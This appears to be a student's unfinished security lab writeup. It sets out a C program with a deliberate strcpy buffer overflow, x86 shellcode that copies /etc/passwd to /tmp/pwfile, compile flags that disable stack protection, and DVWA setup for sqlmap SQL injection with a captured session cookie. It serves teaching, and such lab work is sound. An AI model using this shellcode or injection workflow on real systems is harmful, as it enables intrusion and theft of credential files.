# Lab #1,22110048, Nguyen Hoang Lam, INSE330380E_01FIE
# Task 1: Software buffer overflow attack
Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>
void redundant_code(char* p)
{
    char local[256];
    strncpy(local,p,20);
	printf("redundant code\n");
}
int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode source in asm. This shellcode copy /etc/passwd to /tmp/pwfile
```
global _start
section .text
_start:
    xor eax,eax
    mov al,0x5
    xor ecx,ecx
    push ecx
    push 0x64777373 
    push 0x61702f63
    push 0x74652f2f
    lea ebx,[esp +1]
    int 0x80

    mov ebx,eax
    mov al,0x3
    mov edi,esp
    mov ecx,edi
    push WORD 0xffff
    pop edx
    int 0x80
    mov esi,eax

    push 0x5
    pop eax
    xor ecx,ecx
    push ecx
    push 0x656c6966
    push 0x74756f2f
    push 0x706d742f
    mov ebx,esp
    mov cl,0102o
    push WORD 0644o
    pop edx
    int 0x80

    mov ebx,eax
    push 0x4
    pop eax
    mov ecx,edi
    mov edx,esi
    int 0x80

    xor eax,eax
    xor ebx,ebx
    mov al,0x1
    mov bl,0x5
    int 0x80

```
This lab explores how to exploit a buffer overflow vulnerability  
**Question 1**: Exploration of various encryption with openssl
**Answer 1**:
## 1. Compile asm program and C program to executable code:
Compile the `vuln.c` program without stack protection:  
`gcc -g vuln.c -o vuln.out -fno-stack-protector -mpreferred-stack-boundary=2`  
Compile the Shellcode  
`nasm -f elf32 shellcode.asm -o shellcode.o`  
`ld -m elf_i386 -o shellcode shellcode.o`  
![image](https://github.com/user-attachments/assets/e85de773-01cb-4c7e-b2ba-f32b50b8c21d)  



# Task 2: Attack on database of DVWA
- Install dvwa (on host machine or docker container)
- Make sure you can login with default user
- Install sqlmap
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:
1.  Pull the DVWA Docker image  
Set up the eviroment  

```bash
docker pull vulnerables/web-dvwa
docker run -d -p 80:80 vulnerables/web-dvwa
```
2.  Access DVWA
Open a web browser and go to: http://localhost
Log in with the default credentials:  
Username: admin  
Password: password
![image](https://github.com/user-attachments/assets/a4f05b15-2710-4ea2-9413-2dc902c95a83)

DVWA etup DB page  
Press Create/Reset Database button  
![image](https://github.com/user-attachments/assets/89b2a4fb-2215-4942-803b-b72d85a1ac0a)  

DVWA SQL Injection page  
Input 1 to trigger the SQL injection  
![image](https://github.com/user-attachments/assets/f25e324a-a3e4-4178-8379-c16550d218c6)  

Get cookies  
cookie value= r4jevan9nq5tqg2mbm135ma2m6
![image](https://github.com/user-attachments/assets/2f2f6a01-db0f-4f15-a462-f2a6e270a076)  


**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:

**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:
